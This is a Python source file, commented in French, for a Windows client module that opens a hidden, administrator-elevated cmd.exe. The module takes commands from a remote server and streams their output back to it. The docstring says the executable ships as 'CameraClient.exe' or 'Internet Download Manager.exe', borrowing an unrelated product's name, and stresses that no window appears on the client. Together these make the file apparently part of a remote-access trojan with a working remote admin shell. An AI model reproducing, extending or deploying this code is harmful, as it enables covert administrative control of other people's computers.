"""
CMD Commandes ADMIN côté client Windows.

Même principe que RemoteConsole (console persistante, sans fenêtre, sortie
redirigée vers server_gui), mais la console tourne avec les droits admin.

Le popup UAC natif de Windows s'affiche chez le client via
ShellExecuteW(..., "runas", ...). Si l'utilisateur refuse, start() échoue
proprement et remonte l'information au serveur.

Communication entre le client (non élevé) et le cmd élevé :
  - admin_bridge.py (élevé) est lancé via ShellExecuteW.
  - Il se connecte à un socket TCP localhost ouvert par le client.
  - Le client parle au wrapper via ce socket (texte UTF-8, lignes \\n).
  - Le wrapper fait le pont vers cmd.exe (stdin/stdout/stderr).

DEUX MODES DE LANCEMENT DU BRIDGE (indispensable pour PyInstaller) :
  - Mode développement (python client.py) :
        pythonw.exe  "admin_bridge.py" "<token>" <port>
  - Mode .exe PyInstaller (CameraClient.exe / Internet Download Manager.exe) :
        CameraClient.exe  --admin-bridge "<token>" <port>
    → c'est le MÊME exécutable qui est relancé, mais avec l'argument
      magique --admin-bridge, capté au tout début de client.main() puis
      redirigé vers admin_bridge.run_bridge(). Sans ce mécanisme, le
      pont ne pourrait pas être lancé depuis le .exe figé.

Aucune fenêtre visible côté client. Uniquement Windows.
"""

import platform
import queue
import secrets
import socket
import sys
import threading
import time
from pathlib import Path

import requests


UAC_TIMEOUT_SECONDS = 30.0
BRIDGE_SCRIPT_NAME = "admin_bridge.py"
ADMIN_BRIDGE_FLAG = "--admin-bridge"


def _is_windows() -> bool:
    return platform.system() == "Windows"


def _is_frozen() -> bool:
    """True si on tourne dans un exécutable PyInstaller (.exe --onefile)."""
    return getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS")


def _bridge_script_path() -> "Path | None":
    """En mode dev : admin_bridge.py à côté de client.py.
    En mode .exe : PyInstaller l'a extrait dans sys._MEIPASS."""
    if _is_frozen():
        candidate = Path(sys._MEIPASS) / BRIDGE_SCRIPT_NAME  # type: ignore[attr-defined]
    else:
        candidate = Path(__file__).resolve().parent / BRIDGE_SCRIPT_NAME
    return candidate if candidate.exists() else None


class RemoteAdminConsole:
    """Console cmd.exe élevée, sortie redirigée vers server_gui."""

    def __init__(self, server_url: str, device_id: str):
        self.server_url = server_url
        self.device_id = device_id

        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []

        self._listener: "socket.socket | None" = None
        self._client_sock: "socket.socket | None" = None
        self._listen_port: int | None = None
        self._token: str | None = None

        self._write_lock = threading.Lock()
        self._send_queue: "queue.Queue[str]" = queue.Queue(maxsize=200)

        self._running = False
        self._admin_refused = False

    def is_running(self) -> bool:
        return self._running

    def admin_refused(self) -> bool:
        return self._admin_refused

    def start(self) -> bool:
        if not _is_windows():
            return False
        if self._running:
            return True

        self._admin_refused = False
        self._stop.clear()

        # 1. Socket localhost éphémère (bind strict sur 127.0.0.1)
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("127.0.0.1", 0))
            listener.listen(1)
            listener.settimeout(0.5)
        except OSError:
            return False

        port = listener.getsockname()[1]
        token = secrets.token_hex(32)
        self._listener = listener
        self._listen_port = port
        self._token = token

        # 2. Lancement élevé via ShellExecuteW -> popup UAC natif.
        #    Deux modes selon qu'on tourne en dev ou en .exe PyInstaller.
        try:
            import ctypes

            if _is_frozen():
                # Mode .exe : on relance CameraClient.exe avec --admin-bridge.
                exe_path = Path(sys.executable)
                params = f'{ADMIN_BRIDGE_FLAG} "{token}" {port}'
                workdir = str(exe_path.parent)
            else:
                # Mode dev : pythonw.exe "admin_bridge.py" "<token>" <port>.
                bridge_path = _bridge_script_path()
                if bridge_path is None:
                    listener.close()
                    self._listener = None
                    return False
                pythonw = Path(sys.executable).with_name("pythonw.exe")
                if not pythonw.exists():
                    pythonw = Path(sys.executable)
                exe_path = pythonw
                params = f'"{bridge_path}" "{token}" {port}'
                workdir = str(bridge_path.parent)

            ret = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", str(exe_path), params, workdir, 0
            )
            if ret <= 32:
                # 5 = UAC refusé par l'utilisateur, 1223 = annulé
                self._admin_refused = True
                listener.close()
                self._listener = None
                return False
        except Exception:
            listener.close()
            self._listener = None
            return False

        # 3. Attente de la connexion du wrapper élevé (timeout UAC).
        deadline = time.monotonic() + UAC_TIMEOUT_SECONDS
        client_sock = None
        while time.monotonic() < deadline and not self._stop.is_set():
            try:
                sock, _ = listener.accept()
                sock.settimeout(5.0)
                data = b""
                while b"\n" not in data and len(data) < 256:
                    chunk = sock.recv(256 - len(data))
                    if not chunk:
                        break
                    data += chunk
                line, _ = data.split(b"\n", 1)
                received = line.decode("utf-8", errors="replace").strip()
                if received != token:
                    sock.close()
                    continue
                sock.settimeout(None)
                client_sock = sock
                break
            except socket.timeout:
                continue
            except OSError:
                break

        try:
            listener.close()
        except OSError:
            pass
        self._listener = None

        if client_sock is None:
            self._admin_refused = True
            return False

        self._client_sock = client_sock
        self._running = True

        self._threads = [
            threading.Thread(target=self._reader_loop, daemon=True),
            threading.Thread(target=self._sender_loop, daemon=True),
        ]
        for t in self._threads:
            t.start()
        return True

    def stop(self) -> None:
        self._stop.set()

        if self._client_sock is not None:
            try:
                with self._write_lock:
                    self._client_sock.sendall(b"BYE\n")
            except OSError:
                pass
            try:
                self._client_sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self._client_sock.close()
            except OSError:
                pass
            self._client_sock = None

        for t in self._threads:
            t.join(timeout=2)
        self._threads = []
        self._running = False

    def write_command(self, command: str) -> None:
        if not self._running or self._client_sock is None:
            return
        try:
            with self._write_lock:
                self._client_sock.sendall(
                    ("IN:" + command + "\r\n").encode("utf-8", errors="replace")
                )
        except OSError:
            pass

    def _reader_loop(self) -> None:
        sock = self._client_sock
        if sock is None:
            return
        buf = b""
        sock.settimeout(0.5)
        while not self._stop.is_set():
            try:
                data = sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                text = line.decode("utf-8", errors="replace")
                if text.startswith("OUT:"):
                    payload = text[4:].replace("\r", "\n")
                    try:
                        self._send_queue.put_nowait(payload)
                    except queue.Full:
                        pass
                elif text == "EXIT":
                    self._stop.set()
                    return

        self._running = False

    def _sender_loop(self) -> None:
        session = requests.Session()
        last_send = 0.0
        pending = ""
        while not self._stop.is_set():
            try:
                chunk = self._send_queue.get(timeout=0.2)
                pending += chunk
            except queue.Empty:
                pass
            now = time.monotonic()
            if pending and (now - last_send) >= 0.05:
                try:
                    session.post(
                        f"{self.server_url}/api/shell/output",
                        json={
                            "device_id": self.device_id,
                            "mode": "admin",
                            "chunk": pending[-16384:],
                        },
                        timeout=5,
                    )
                    pending = ""
                    last_send = now
                except requests.RequestException:
                    pass
        if pending:
            try:
                session.post(
                    f"{self.server_url}/api/shell/output",
                    json={
                        "device_id": self.device_id,
                        "mode": "admin",
                        "chunk": pending,
                    },
                    timeout=5,
                )
            except requests.RequestException:
                pass